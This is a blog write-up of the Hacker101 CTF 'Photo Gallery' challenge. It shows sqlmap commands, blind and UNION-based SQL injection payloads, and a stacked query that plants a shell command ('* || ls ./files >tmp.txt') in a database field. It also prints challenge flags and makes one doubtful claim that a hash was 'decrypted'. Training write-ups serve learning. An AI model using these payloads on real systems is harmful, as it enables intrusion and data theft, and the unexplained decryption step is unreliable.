</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span></span><span class="token token" style="color:#4e5c63"># It&#x27;s dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file(&#x27;./%s&#x27; % cur.fetchone()[0].replace(&#x27;..&#x27;, &#x27;&#x27;), &#x27;rb&#x27;).read() if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;, port=80)</span></span></code></pre><p><code>return MySQLdb.connect(host=&quot;localhost&quot;, user=&quot;root&quot;, password=&quot;&quot;, db=&quot;level5&quot;)</code></p><p>we also see that they are using the photos table</p><p><code>cur.execute(&#x27;SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3&#x27;, (id, ))</code></p><p>lets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>sqlmap </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>u </span><span class="token token" style="color:#c9c0be;background:#000000">&quot;http://34.74.105.127/ad3e8c7df9/fetch?id=1&quot;</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>method</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>dump </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>D level5 </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>T photos </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>p </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#999999">,</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>code</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">200</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>ignore</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>code</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">500</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>skip</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>waf </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>o </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>threads </span><span class="token token" style="color:#4499ee">2</span></span></code></pre><p>This can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column <code>filename</code> since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>sqlmap </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>u </span><span class="token token" style="color:#c9c0be;background:#000000">&quot;http://35.190.155.168/c947e97f6e/fetch?id=3&quot;</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>method</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>dump </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>D level5 </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>T photos </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>p </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#999999">,</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>code</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">200</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>ignore</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>code</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">500</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>skip</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>waf </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>o </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>threads </span><span class="token token" style="color:#4499ee">4</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>C filename</span></span></code></pre><p>This means that swlmap will start with the filename of id=3 which is exactly what we want right now.</p><p><img src="/hackerone/photo-gallery-hash.png" alt="starts to query filename of id 3" title="query on the filename of id 3"/>
So lets have a look at our results:</p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>Database</span><span class="token token" style="color:#999999">:</span><span> level5
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>Table</span><span class="token token" style="color:#999999">:</span><span> photos
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span></span><span class="token token" style="color:#999999">[</span><span class="token token" style="color:#4499ee">3</span><span> entries</span><span class="token token" style="color:#999999">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">5</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> filename </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">6</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">7</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#4499ee">9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">8</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> files</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>adorable</span><span class="token token" style="color:#999999">.</span><span>jpg </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">9</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> files</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>purrfect</span><span class="token token" style="color:#999999">.</span><span>jpg </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">10</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">+</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">+</span></span></code></pre><blockquote><p>you might be getting partial values like so:
<code>9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????</code>
you should be able to re-run sqlmap to find the missing characters
<code>9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa</code></p></blockquote><p>decrypted: <code>\*||+ls+-a+tmp.txt</code></p><p>so we try this request:
<code>GET /ad3e8c7df9/fetch?id=3\*||+ls+-a+tmp.txt</code></p><p><code>GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\*%20||%20ls%20./files%20%3Etmp.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1</code></p><p><code>GET /ad3e8c7df9/fetch?id=4 UNION SELECT &#x27;temp.txt&#x27;-- HTTP/1.1</code></p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#c9c0be;background:#000000">&quot;^FLAG^9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa</span><span class="token token" style="color:#ee9900;background:#000000">$FLAG</span><span class="token token" style="color:#c9c0be;background:#000000">$&quot;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">&quot;^FLAG^63a407d0083bf2aedd862d762fcf96e8a7f8bf751e1ac24bec781a74564ee9f2</span><span class="token token" style="color:#ee9900;background:#000000">$FLAG</span><span class="token token" style="color:#c9c0be;background:#000000">$&quot;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span></span><span class="token token assign-left environment" style="color:#ee9900">HOSTNAME</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>ad3e8c7df92d
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span></span><span class="token token assign-left environment" style="color:#ee9900">SHLVL</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0</span></span></code></pre></div></div></div></div><div style="flex:1" class="jsx-2179548495"></div><div style="top:0;width:100%;height:56px;display:flex;flex-direction:row;align-items:center;justify-content:space-between;background-color:#04060A;color:#F07693;padding:24px;font-size:12pt"><p>© lwlx. 2021</p><a href="/rss.xml"><img src="/rss-white.svg" alt="RSS Feed" height="24" width="24"/></a><p>Version <!-- -->0.4.3</p></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"path":"blog/hacker101-ctf-photo-gallery","title":"Hacker101 CTF Photo Gallery writeup","subtitle":null,"published":true,"datePublished":1609676432536,"tags":["ctf","writeup","hackerone","hacker101","security"],"description":"A write up for the Photo Gallery [moderae] challenge","canonicalUrl":"https://dev.lwlx.xyz/blog/hacker101-ctf-photo-gallery","author":"lwlx","authorPhoto":"/profile.jpg","authorTwitter":"0x0000005","bannerPhoto":"/hackerone/hackerone.png","thumbnailPhoto":"/hackerone/hackerone.png","content":"\n# Photo Gallery _[moderate]_\n\nThis is my Write Up for the \"Photo Gallery\" challenge of HackerOne's CTF.\n\nAs usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.\nThe missing one is called `Invisible`, so lets look into that.\n\n```\nhttp://34.74.105.127/ad3e8c7df9/\n```\n\n![initial page](/hackerone/photogallery-start.png \"initial page\")\n\n## Information gathering\n\nwith Burp we were able to find that the server returns no content for this image.\nimages are loaded with a `GET` Request to the server like so:\n\n`GET /ad3e8c7df9/fetch?id=1 HTTP/1.1`\n\nthis also aligns with the first tip we are provided:\n\n\u003e Hint 1: _Consider how you might build this system yourself. What would the **query for fetch** look like?_\n\nnaturally we start fuzzing the `id` parameter.\n\n```python\nGET /ad3e8c7df9/fetch?id=4 HTTP/1.1 # 404\nGET /ad3e8c7df9/fetch?id=0 HTTP/1.1 # 404\nGET /ad3e8c7df9/fetch?id=-1 HTTP/1.1 # 500\n```\n\nalright, no quick wins, so let's give it a try with fizzing using sqlmap.\nQuickly we are able to see that the server seems to be vulnerable to some attack.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=2\"\n```\n\nThis command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.\nwhen we are done we should know what to do next.\n\n## Gathered Data\n\n### sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:\n\n```python\nParameter: id (GET)\nType: boolean-based blind\nTitle: AND boolean-based blind - WHERE or HAVING clause\nPayload: id=2 AND 3567=3567\n\nType: time-based blind\nTitle: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP)\nPayload: id=2 AND (SELECT 8480 FROM (SELECT(SLEEP(5)))KHRS)\n```\n\n```python\n[21:44:44] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.14.0\nback-end DBMS: MySQL \u003e= 5.0.12 (MariaDB fork)\n```\n\n### Our Target Server:\n\n    | Type      | Service      | Version                  | Vulnerable?    |\n    | --------- | ------------ | ------------------------ | -------------- |\n    | OS        | Linux Ubuntu | ??                       | not focused    |\n    | Webserver | Nginx        | 1.14.0                   | no             |\n    | Database  | MySQL        | \u003e= 5.0.12 (MariaDB fork) | yes (id param) |\n\nGood, we got something, we know the server is vulnerable to multiple vulnerabilities such as a 'boolean base blind'. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=2\" -f --os=linux --dbms=mysql --level=3 -o\n```\n\nwe dont really get any more useful information from here.\nsoo.. were kinda stuck lets just get another hint then:\n\n\u003e Hint 2: _Take a few minutes to consider the **state of the union**_\n\nThe state uf the union? are they hinting on using UNION statements in the query?\n_The UNION operator is used to combine the result-set of two or more SELECT statements._\nThat seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:\n\nhttp://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'\n\nbut what do we look for? Lets get another hint.\n\n\u003e Hint 3: _This application runs on the **uwsgi-nginx-flask-docker** image_\n\nuwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.\n\nhttps://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files\n\n\u003e uWSGI can be configured using several different methods.\n\nYAML, JSON, INI are some supported formats -\u003e ini beeing the defualt so lets try getting the 'uwsgi.ini' file?\n\n![union select wiht burp repeater](/hackerone/union-select-ini.png \"union select wiht burp repeater\")\n\nthis returns us some configdata pointing to module main which is the entrypoint.\n\n```python\n[uwsgi]\nmodule = main\ncallable = app\n```\n\nso lets see if we can also fethc the main.py\n\n```python\nhttp://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--\n```\n\nHere we get lots of infos our **first FLAG** and the db connection settings:\n\n### FLAG 0:\n\n```python\n%s\n' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\\n', 1)[-1] + '' rep += '\n\\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)\n# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == \"__main__\": app.run(host='0.0.0.0', port=80)\n```\n\n`return MySQLdb.connect(host=\"localhost\", user=\"root\", password=\"\", db=\"level5\")`\n\nwe also see that they are using the photos table\n\n`cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))`\n\nlets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=1\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2\n```\n\nThis can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column `filename` since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.\n\n```python\nsqlmap -u \"http://35.190.155.168/c947e97f6e/fetch?id=3\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename\n```\n\nThis means that swlmap will start with the filename of id=3 which is exactly what we want right now.\n\n![starts to query filename of id 3](/hackerone/photo-gallery-hash.png \"query on the filename of id 3\")\nSo lets have a look at our results:\n\n```python\nDatabase: level5\nTable: photos\n[3 entries]\n+------------------------------------------------------------------+\n| filename |\n+------------------------------------------------------------------+\n| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |\n| files/adorable.jpg |\n| files/purrfect.jpg |\n+------------------------------------------------------------------+\n```\n\n\u003e you might be getting partial values like so:\n\u003e `9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????`\n\u003e you should be able to re-run sqlmap to find the missing characters\n\u003e `9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa`\n\ndecrypted: `\\*||+ls+-a+tmp.txt`\n\nso we try this request:\n`GET /ad3e8c7df9/fetch?id=3\\*||+ls+-a+tmp.txt`\n\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\\*%20||%20ls%20./files%20%3Etmp.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`\n\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'temp.txt'-- 